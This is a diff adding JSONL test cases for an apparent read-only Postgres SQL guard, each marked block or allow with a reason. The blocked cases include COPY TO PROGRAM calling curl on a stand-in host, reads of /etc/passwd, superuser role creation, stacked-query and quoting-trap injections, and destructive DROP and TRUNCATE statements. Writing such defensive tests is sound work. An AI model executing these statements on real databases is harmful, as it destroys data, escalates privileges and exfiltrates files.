@@ -1,0 +1,122 @@
+{"id":"d01","category":"destructive","expect":"block","sql":"DROP TABLE users","why":"classic drop"}
+{"id":"d02","category":"destructive","expect":"block","sql":"DROP TABLE IF EXISTS users CASCADE","why":"drop with cascade"}
+{"id":"d03","category":"destructive","expect":"block","sql":"DROP SCHEMA public CASCADE","why":"drops everything in the schema"}
+{"id":"d04","category":"destructive","expect":"block","sql":"DROP DATABASE production","why":"drop database"}
+{"id":"d05","category":"destructive","expect":"block","sql":"TRUNCATE users","why":"wipes the table"}
+{"id":"d06","category":"destructive","expect":"block","sql":"TRUNCATE TABLE users, orders RESTART IDENTITY CASCADE","why":"multi-table truncate"}
+{"id":"d07","category":"destructive","expect":"block","sql":"DELETE FROM users","why":"delete all rows"}
+{"id":"d08","category":"destructive","expect":"block","sql":"DELETE FROM users WHERE id = 1","why":"any write is blocked in a strict read-only policy"}
+{"id":"d09","category":"destructive","expect":"block","sql":"UPDATE users SET email = 'x@y.z'","why":"update all rows"}
+{"id":"d10","category":"destructive","expect":"block","sql":"INSERT INTO users (name) VALUES ('x')","why":"write blocked in a read-only policy"}
+{"id":"d11","category":"destructive","expect":"block","sql":"ALTER TABLE users DROP COLUMN email","why":"schema change"}
+{"id":"d12","category":"destructive","expect":"block","sql":"CREATE TABLE evil (id int)","why":"DDL"}
+{"id":"d13","category":"destructive","expect":"block","sql":"GRANT ALL ON users TO PUBLIC","why":"privilege change"}
+{"id":"d14","category":"destructive","expect":"block","sql":"CREATE ROLE attacker SUPERUSER LOGIN PASSWORD 'x'","why":"privilege escalation"}
+{"id":"d15","category":"destructive","expect":"block","sql":"ALTER USER postgres PASSWORD 'x'","why":"account takeover"}
+{"id":"d16","category":"destructive","expect":"block","sql":"CREATE EXTENSION dblink","why":"loads new capabilities"}
+{"id":"d17","category":"destructive","expect":"block","sql":"CREATE FUNCTION f() RETURNS void AS $$ DROP TABLE users; $$ LANGUAGE sql","why":"hides a drop inside a function"}
+{"id":"d18","category":"destructive","expect":"block","sql":"VACUUM FULL users","why":"takes heavy locks"}
+{"id":"m01","category":"multi-statement","expect":"block","sql":"SELECT 1; DROP TABLE users","why":"stacked query"}
+{"id":"m02","category":"multi-statement","expect":"block","sql":"SELECT 1;DROP TABLE users;--","why":"no spaces plus trailing comment"}
+{"id":"m03","category":"multi-statement","expect":"block","sql":"SELECT * FROM users; DELETE FROM users","why":"read then delete"}
+{"id":"m04","category":"multi-statement","expect":"block","sql":"SELECT 1;\nDROP TABLE users","why":"newline as separator"}
+{"id":"m05","category":"multi-statement","expect":"block","sql":"SELECT 1; SELECT 2","why":"policy: no multi-statement queries at all"}
+{"id":"m06","category":"multi-statement","expect":"block","sql":"BEGIN; DROP TABLE users; COMMIT","why":"transaction wrapper"}
+{"id":"m07","category":"multi-statement","expect":"block","sql":"SELECT 1; /* hidden */ TRUNCATE users","why":"comment between statements"}
+{"id":"m08","category":"multi-statement","expect":"block","sql":"SELECT 'a'; DROP TABLE users; SELECT 'b'","why":"drop sandwiched between selects"}
+{"id":"c01","category":"cte-write","expect":"block","sql":"WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d","why":"data-modifying CTE looks like a SELECT"}
+{"id":"c02","category":"cte-write","expect":"block","sql":"WITH u AS (UPDATE users SET admin = true RETURNING *) SELECT * FROM u","why":"update hidden in a CTE"}
+{"id":"c03","category":"cte-write","expect":"block","sql":"WITH i AS (INSERT INTO users (name) VALUES ('x') RETURNING *) SELECT * FROM i","why":"insert hidden in a CTE"}
+{"id":"c04","category":"cte-write","expect":"block","sql":"WITH a AS (SELECT 1), b AS (DELETE FROM users RETURNING id) SELECT * FROM b","why":"write hidden as the second CTE"}
+{"id":"c05","category":"cte-write","expect":"block","sql":"SELECT * FROM (WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d) x","why":"write nested in a subquery"}
+{"id":"e01","category":"explain-analyze","expect":"block","sql":"EXPLAIN ANALYZE DELETE FROM users","why":"ANALYZE really executes the statement"}
+{"id":"e02","category":"explain-analyze","expect":"block","sql":"EXPLAIN (ANALYZE) UPDATE users SET name = 'x'","why":"option-list form of ANALYZE"}
+{"id":"e03","category":"explain-analyze","expect":"block","sql":"EXPLAIN ANALYZE SELECT pg_sleep(100)","why":"ANALYZE executes the function call"}
+{"id":"e04","category":"explain-analyze","expect":"block","sql":"EXPLAIN (ANALYZE, BUFFERS) WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d","why":"ANALYZE plus a data-modifying CTE"}
+{"id":"p01","category":"procedural","expect":"block","sql":"DO $$ BEGIN DROP TABLE users; END $$","why":"anonymous code block"}
+{"id":"p02","category":"procedural","expect":"block","sql":"DO LANGUAGE plpgsql $$ BEGIN EXECUTE 'DROP TABLE users'; END $$","why":"dynamic SQL inside a DO block"}
+{"id":"p03","category":"procedural","expect":"block","sql":"PREPARE p AS DELETE FROM users","why":"prepared write"}
+{"id":"p04","category":"procedural","expect":"block","sql":"EXECUTE p","why":"runs whatever was prepared earlier"}
+{"id":"p05","category":"procedural","expect":"block","sql":"CALL cleanup_everything()","why":"procedures can do anything"}
+{"id":"f01","category":"file-and-copy","expect":"block","sql":"COPY users TO PROGRAM 'curl http://evil.example/x'","why":"runs a shell command"}
+{"id":"f02","category":"file-and-copy","expect":"block","sql":"COPY users FROM PROGRAM 'id'","why":"runs a shell command"}
+{"id":"f03","category":"file-and-copy","expect":"block","sql":"COPY users TO '/tmp/users.csv'","why":"writes a file on the server"}
+{"id":"f04","category":"file-and-copy","expect":"block","sql":"COPY (SELECT * FROM users) TO STDOUT","why":"bulk exfiltration path"}
+{"id":"f05","category":"file-and-copy","expect":"block","sql":"SELECT pg_read_file('/etc/passwd')","why":"reads server files"}
+{"id":"f06","category":"file-and-copy","expect":"block","sql":"SELECT * FROM pg_ls_dir('.')","why":"lists server directories"}
+{"id":"f07","category":"file-and-copy","expect":"block","sql":"SELECT lo_import('/etc/passwd')","why":"imports a server file"}
+{"id":"f08","category":"file-and-copy","expect":"block","sql":"SELECT lo_export(12345, '/tmp/x')","why":"writes a server file"}
+{"id":"f09","category":"file-and-copy","expect":"block","sql":"SELECT pg_read_binary_file('/etc/passwd')","why":"reads server files"}
+{"id":"g01","category":"dangerous-function","expect":"block","sql":"SELECT pg_terminate_backend(pid) FROM pg_stat_activity","why":"kills other connections"}
+{"id":"g02","category":"dangerous-function","expect":"block","sql":"SELECT pg_cancel_backend(1234)","why":"cancels other queries"}
+{"id":"g03","category":"dangerous-function","expect":"block","sql":"SELECT pg_sleep(100000)","why":"denial of service"}
+{"id":"g04","category":"dangerous-function","expect":"block","sql":"SELECT pg_reload_conf()","why":"reloads server config"}
+{"id":"g05","category":"dangerous-function","expect":"block","sql":"SELECT set_config('session_replication_role', 'replica', false)","why":"disables triggers and constraints"}
+{"id":"g06","category":"dangerous-function","expect":"block","sql":"SELECT dblink_exec('host=evil dbname=x', 'DROP TABLE users')","why":"runs SQL on another database"}
+{"id":"g07","category":"dangerous-function","expect":"block","sql":"SELECT pg_advisory_lock(1)","why":"lock-based denial of service"}
+{"id":"g08","category":"dangerous-function","expect":"block","sql":"SELECT nextval('users_id_seq')","why":"a SELECT that changes state"}
+{"id":"g09","category":"dangerous-function","expect":"block","sql":"SELECT setval('users_id_seq', 1)","why":"a SELECT that changes state"}
+{"id":"s01","category":"select-side-effects","expect":"block","sql":"SELECT * INTO backup_users FROM users","why":"SELECT INTO creates a table"}
+{"id":"s02","category":"select-side-effects","expect":"block","sql":"SELECT * FROM users FOR UPDATE","why":"locks rows"}
+{"id":"s03","category":"select-side-effects","expect":"block","sql":"SELECT * FROM users FOR SHARE","why":"locks rows"}
+{"id":"s04","category":"select-side-effects","expect":"block","sql":"CREATE TABLE copy AS SELECT * FROM users","why":"creates a table from a SELECT"}
+{"id":"s05","category":"select-side-effects","expect":"block","sql":"CREATE TEMP TABLE t AS SELECT 1","why":"creates a table, even a temp one"}
+{"id":"t01","category":"session-control","expect":"block","sql":"SET default_transaction_read_only = off","why":"turns off the read-only safety net"}
+{"id":"t02","category":"session-control","expect":"block","sql":"SET ROLE postgres","why":"privilege switch"}
+{"id":"t03","category":"session-control","expect":"block","sql":"SET SESSION AUTHORIZATION postgres","why":"privilege switch"}
+{"id":"t04","category":"session-control","expect":"block","sql":"RESET ALL","why":"resets safety settings"}
+{"id":"t05","category":"session-control","expect":"block","sql":"BEGIN READ WRITE","why":"re-enables writes"}
+{"id":"t06","category":"session-control","expect":"block","sql":"SET statement_timeout = 0","why":"removes the timeout safety net"}
+{"id":"t07","category":"session-control","expect":"block","sql":"NOTIFY alert, 'x'","why":"side effect on other clients"}
+{"id":"t08","category":"session-control","expect":"block","sql":"ROLLBACK","why":"policy: no transaction control"}
+{"id":"o01","category":"obfuscation","expect":"block","sql":"dRoP tAbLe users","why":"mixed case"}
+{"id":"o02","category":"obfuscation","expect":"block","sql":"DROP/**/TABLE users","why":"a comment counts as whitespace in Postgres"}
+{"id":"o03","category":"obfuscation","expect":"block","sql":"DROP\nTABLE\tusers","why":"newline and tab as whitespace"}
+{"id":"o04","category":"obfuscation","expect":"block","sql":"/* harmless */ DROP TABLE users","why":"leading comment"}
+{"id":"o05","category":"obfuscation","expect":"block","sql":"-- note\nDROP TABLE users","why":"leading line comment"}
+{"id":"o06","category":"obfuscation","expect":"block","sql":"  \n  DROP TABLE users  ","why":"padding whitespace"}
+{"id":"o07","category":"obfuscation","expect":"block","sql":"DROP TABLE users;","why":"trailing semicolon"}
+{"id":"o08","category":"obfuscation","expect":"block","sql":"DR\u200bOP TABLE users","why":"zero-width space; invalid SQL must fail closed"}
+{"id":"o09","category":"obfuscation","expect":"block","sql":"DROP TABLE \"users\"","why":"quoted identifier"}
+{"id":"o10","category":"obfuscation","expect":"block","sql":"DROP TABLE public.users","why":"schema-qualified name"}
+{"id":"o11","category":"obfuscation","expect":"block","sql":"SELECT 1\u0000; DROP TABLE users","why":"null byte before the semicolon"}
+{"id":"o12","category":"obfuscation","expect":"block","sql":"WITH x AS (SELECT 1) DELETE FROM users","why":"starts with WITH but is a DELETE"}
+{"id":"o13","category":"obfuscation","expect":"block","sql":"(SELECT 1); DROP TABLE users","why":"parenthesised first statement"}
+{"id":"z01","category":"fail-closed","expect":"block","sql":"","why":"empty input"}
+{"id":"z02","category":"fail-closed","expect":"block","sql":"   ","why":"whitespace only"}
+{"id":"z03","category":"fail-closed","expect":"block","sql":";","why":"lone semicolon"}
+{"id":"z04","category":"fail-closed","expect":"block","sql":"SELEC * FROM users","why":"syntax error must not pass through"}
+{"id":"z05","category":"fail-closed","expect":"block","sql":"SELECT * FROM","why":"incomplete statement"}
+{"id":"z06","category":"fail-closed","expect":"block","sql":"DROP","why":"truncated statement"}
+{"id":"z07","category":"fail-closed","expect":"block","sql":"SELECT 'unterminated","why":"unterminated string"}
+{"id":"z08","category":"fail-closed","expect":"block","sql":"SELECT $$ unterminated","why":"unterminated dollar quote"}
+{"id":"z09","category":"fail-closed","expect":"block","sql":"SELECT 1 /* unterminated comment","why":"unterminated comment"}
+{"id":"q01","category":"quoting-traps","expect":"block","sql":"SELECT 'it\\'; DROP TABLE x; --'","why":"standard strings: backslash is literal, so the quote closes and the DROP runs"}
+{"id":"q02","category":"quoting-traps","expect":"allow","sql":"SELECT E'it\\'s; DROP TABLE x'","why":"E-string: backslash-quote is an escape, so it is all one string"}
+{"id":"q03","category":"quoting-traps","expect":"allow","sql":"SELECT * FROM users WHERE name = 'x; DROP TABLE users'","why":"injection text inside a string literal is just data"}
+{"id":"q04","category":"quoting-traps","expect":"allow","sql":"SELECT 'DROP TABLE users' AS note","why":"keyword inside a string literal"}
+{"id":"q05","category":"quoting-traps","expect":"allow","sql":"SELECT 1 -- ; DROP TABLE users","why":"inside a line comment"}
+{"id":"q06","category":"quoting-traps","expect":"allow","sql":"/* DROP TABLE users */ SELECT 1","why":"inside a block comment"}
+{"id":"q07","category":"quoting-traps","expect":"allow","sql":"SELECT $$; DROP TABLE users; $$","why":"inside a dollar-quoted string"}
+{"id":"q08","category":"quoting-traps","expect":"allow","sql":"SELECT 'it''s fine' AS s","why":"doubled-quote escape"}
+{"id":"q09","category":"quoting-traps","expect":"allow","sql":"SELECT 1 /* outer /* inner */ still comment ; DROP TABLE users */","why":"Postgres block comments nest"}
+{"id":"a01","category":"safe-read","expect":"allow","sql":"SELECT 1","why":"minimal read"}
+{"id":"a02","category":"safe-read","expect":"allow","sql":"SELECT id, name, email FROM users WHERE id = 42","why":"plain read"}
+{"id":"a03","category":"safe-read","expect":"allow","sql":"SELECT u.name, count(o.id) FROM users u LEFT JOIN orders o ON o.user_id = u.id GROUP BY u.name ORDER BY 2 DESC LIMIT 10","why":"join plus aggregate"}
+{"id":"a04","category":"safe-read","expect":"allow","sql":"WITH recent AS (SELECT * FROM orders WHERE created_at > now() - interval '7 days') SELECT count(*) FROM recent","why":"read-only CTE"}
+{"id":"a05","category":"safe-read","expect":"allow","sql":"SELECT delete_flag, update_count FROM drops","why":"keywords inside identifiers"}
+{"id":"a06","category":"safe-read","expect":"allow","sql":"SELECT \"drop\", \"delete\" FROM \"truncate\"","why":"quoted identifiers named like keywords"}
+{"id":"a07","category":"safe-read","expect":"allow","sql":"SELECT * FROM users WHERE bio LIKE '%DELETE FROM%'","why":"keyword inside a LIKE pattern"}
+{"id":"a08","category":"safe-read","expect":"allow","sql":"SELECT row_number() OVER (PARTITION BY dept ORDER BY salary DESC) FROM employees","why":"window function"}
+{"id":"a09","category":"safe-read","expect":"allow","sql":"SELECT data->>'name' FROM events WHERE data @> '{\"type\": \"click\"}'","why":"JSON operators"}
+{"id":"a10","category":"safe-read","expect":"allow","sql":"SELECT * FROM generate_series(1, 10)","why":"harmless set-returning function"}
+{"id":"a11","category":"safe-read","expect":"allow","sql":"SELECT now(), current_date, version()","why":"harmless built-ins"}
+{"id":"a12","category":"safe-read","expect":"allow","sql":"EXPLAIN SELECT * FROM users WHERE id = 1","why":"EXPLAIN without ANALYZE does not execute"}
+{"id":"a13","category":"safe-read","expect":"allow","sql":"SELECT count(*) FROM information_schema.tables","why":"catalog read"}
+{"id":"a14","category":"safe-read","expect":"allow","sql":"SELECT a.x FROM (SELECT 1 AS x) a","why":"subquery"}
+{"id":"a15","category":"safe-read","expect":"allow","sql":"SELECT * FROM users;","why":"single statement with trailing semicolon"}
+{"id":"a16","category":"safe-read","expect":"allow","sql":"SELECT 1; -- done","why":"single statement plus trailing comment"}
+{"id":"a17","category":"safe-read","expect":"allow","sql":"TABLE users","why":"valid Postgres shorthand for SELECT *"}
+{"id":"a18","category":"safe-read","expect":"allow","sql":"VALUES (1), (2)","why":"valid read-only statement"}
+{"id":"a19","category":"safe-read","expect":"allow","sql":"SELECT * FROM users u WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id)","why":"correlated subquery"}
+{"id":"a20","category":"safe-read","expect":"allow","sql":"SELECT * FROM \"ユーザー\"","why":"non-ASCII quoted identifier"}
